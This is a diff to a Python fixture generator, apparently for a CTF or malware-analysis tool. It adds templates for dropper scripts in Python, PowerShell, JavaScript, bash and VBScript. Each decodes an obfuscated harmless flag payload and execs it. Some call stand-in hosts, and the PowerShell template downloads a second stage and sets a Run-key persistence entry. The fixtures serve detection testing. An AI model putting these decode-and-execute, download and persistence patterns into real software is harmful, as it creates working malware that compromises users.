@@ -150,6 +150,145 @@ def powershell_dropper() -> str:
     )
 
 
+def lens_python_dropper() -> str:
+    """A Python dropper: base64 -> AES-256-CBC -> exec. Never executed by the tests."""
+    key = hashlib.sha256(b"correct horse battery staple").digest()
+    iv = bytes.fromhex("0f1e2d3c4b5a69788796a5b4c3d2e1f0")
+    payload = b'print("CYBN{fixture_lens_python_aes}")\n'
+    blob = base64.b64encode(AES.new(key, AES.MODE_CBC, iv).encrypt(pad(payload, 16))).decode()
+    return (
+        "#!/usr/bin/env python3\n"
+        '"""Invoice helper - do not edit."""\n'
+        "import base64\n"
+        "from Crypto.Cipher import AES\n"
+        "from Crypto.Util.Padding import unpad\n"
+        "\n"
+        f'KEY = bytes.fromhex("{key.hex()}")\n'
+        f'IV = bytes.fromhex("{iv.hex()}")\n'
+        f'BLOB = "{blob}"\n'
+        'CALLBACK = "http://invoice.example.invalid/report.php"\n'
+        "\n"
+        "def main():\n"
+        "    stage = unpad(AES.new(KEY, AES.MODE_CBC, IV).decrypt(base64.b64decode(BLOB)), 16)\n"
+        "    exec(stage)\n"
+        "\n"
+        'if __name__ == "__main__":\n'
+        "    main()\n"
+    )
+
+
+def lens_python_layers() -> str:
+    """Python, three layers: base64 -> zlib -> repeating-key XOR -> exec."""
+    payload = b'print("CYBN{fixture_lens_python_layers}")\n'
+    key = b"L4y3rs!"
+    blob = base64.b64encode(zlib.compress(xor(payload, key))).decode()
+    return (
+        "import base64, zlib\n"
+        "\n"
+        f"K = {key!r}\n"
+        f'D = "{blob}"\n'
+        "\n"
+        "raw = zlib.decompress(base64.b64decode(D))\n"
+        "out = bytes(b ^ K[i % len(K)] for i, b in enumerate(raw))\n"
+        "exec(out)\n"
+    )
+
+
+def lens_python_fernet() -> str:
+    """Python using Fernet with a hardcoded key."""
+    key = base64.urlsafe_b64encode(hashlib.sha256(b"fernet-fixture").digest()).decode()
+    return (
+        "from cryptography.fernet import Fernet\n"
+        "\n"
+        f'FERNET_KEY = "{key}"\n'
+        'TOKEN = "gAAAAABlTmFrZXRoaXNpc25vdGFyZWFsdG9rZW5idXRpdGxvb2tzbGlrZW9uZQ=="\n'
+        "\n"
+        "print(Fernet(FERNET_KEY).decrypt(TOKEN))\n"
+    )
+
+
+def lens_powershell_dropper() -> str:
+    """PowerShell: base64 + single-byte XOR + AES through .NET + a download."""
+    payload = 'Write-Host "CYBN{fixture_lens_powershell}"'
+    blob = base64.b64encode(xor(payload.encode(), b"\x3b")).decode()
+    key_bytes = ", ".join(f"0x{byte:02x}" for byte in hashlib.md5(b"ps-key").digest())
+    iv_bytes = ", ".join(f"0x{byte:02x}" for byte in bytes(range(16)))
+    return (
+        "# Windows maintenance task\n"
+        "$k = 0x3b\n"
+        f'$enc = "{blob}"\n'
+        "$bytes = [System.Convert]::FromBase64String($enc)\n"
+        "$clear = -join ($bytes | ForEach-Object { [char]($_ -bxor $k) })\n"
+        "Invoke-Expression $clear\n"
+        "\n"
+        "$aes = New-Object System.Security.Cryptography.AesManaged\n"
+        f"$aes.Key = [byte[]] @({key_bytes})\n"
+        f"$aes.IV = [byte[]] @({iv_bytes})\n"
+        "$client = New-Object System.Net.WebClient\n"
+        '$client.DownloadFile("http://update.example.invalid/stage2.bin",'
+        ' "C:\\Windows\\Temp\\s2.bin")\n'
+        'Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"'
+        " -Name Updater -Value $PSCommandPath\n"
+    )
+
+
+def lens_javascript_cryptojs() -> str:
+    """JavaScript: atob + charCodeAt XOR + CryptoJS.AES with a passphrase."""
+    payload = 'console.log("CYBN{fixture_lens_javascript}")'
+    blob = base64.b64encode(xor(payload.encode(), b"\x17")).decode()
+    return (
+        "// analytics helper\n"
+        f'var enc = "{blob}";\n'
+        "var raw = atob(enc);\n"
+        'var out = "";\n'
+        "for (var i = 0; i < raw.length; i++) {\n"
+        "  out += String.fromCharCode(raw.charCodeAt(i) ^ 0x17);\n"
+        "}\n"
+        "eval(out);\n"
+        "\n"
+        'var secret = CryptoJS.AES.decrypt("U2FsdGVkX1+abcdefghijklmnopqrstuvwx==",'
+        ' "s3cr3tpassphrase");\n'
+        'fetch("http://analytics.example.invalid/beacon");\n'
+    )
+
+
+def lens_bash_openssl() -> str:
+    """bash: base64 -d piped into openssl enc -d, with the password on the line."""
+    payload = b'echo "CYBN{fixture_lens_bash}"\n'
+    salt = bytes.fromhex("a1b2c3d4e5f60718")
+    key, iv = evp_bytes_to_key(b"bashpass", salt, 32, 16)
+    body = b"Salted__" + salt + AES.new(key, AES.MODE_CBC, iv).encrypt(pad(payload, 16))
+    blob = base64.b64encode(body).decode()
+    return (
+        "#!/bin/bash\n"
+        "# system health check\n"
+        f'BLOB="{blob}"\n'
+        'echo "$BLOB" | base64 -d'
+        " | openssl enc -d -aes-256-cbc -md md5 -pass pass:bashpass | bash\n"
+        "curl -s http://health.example.invalid/ping > /dev/null\n"
+    )
+
+
+def lens_vbs_dropper() -> str:
+    """VBScript: Chr(Asc(c) Xor n) loop, a download and a Run."""
+    payload = 'WScript.Echo "CYBN{fixture_lens_vbs}"'
+    blob = "".join(f"{byte ^ 0x2A:02x}" for byte in payload.encode())
+    return (
+        "' Office update helper\n"
+        f'Dim data : data = "{blob}"\n'
+        "Dim out, i\n"
+        "For i = 1 To Len(data) Step 2\n"
+        '    out = out & Chr(Asc(Chr(CLng("&H" & Mid(data, i, 2)))) Xor 42)\n'
+        "Next\n"
+        "ExecuteGlobal out\n"
+        "\n"
+        'Set http = CreateObject("MSXML2.XMLHTTP")\n'
+        'http.Open "GET", "http://office.example.invalid/update.dat", False\n'
+        'Set shell = CreateObject("WScript.Shell")\n'
+        'shell.Run "cmd /c echo done"\n'
+    )
+
+
 def main() -> None:
     FIXTURES.mkdir(exist_ok=True)
     print(f"writing fixtures to {FIXTURES}")
@@ -288,6 +427,16 @@ def main() -> None:
         previous = xtea_encrypt_block(block, xtea_key, "big")
         blocks += previous
     write("xtea_cbc.bin", xtea_iv + blocks)
+
+    # --- Code Lens (M4): one script per language, each with a different API ---
+    # These files are DATA. Nothing in ctfc or in the tests ever executes them.
+    write("lens_dropper.py", lens_python_dropper())
+    write("lens_layers.py", lens_python_layers())
+    write("lens_fernet.py", lens_python_fernet())
+    write("lens_dropper.ps1", lens_powershell_dropper())
+    write("lens_cryptojs.js", lens_javascript_cryptojs())
+    write("lens_openssl.sh", lens_bash_openssl())
+    write("lens_dropper.vbs", lens_vbs_dropper())
 
     # Text formats recognised by prefix
     header = base64.urlsafe_b64encode(b'{"alg":"HS256","typ":"JWT"}').rstrip(b"=")
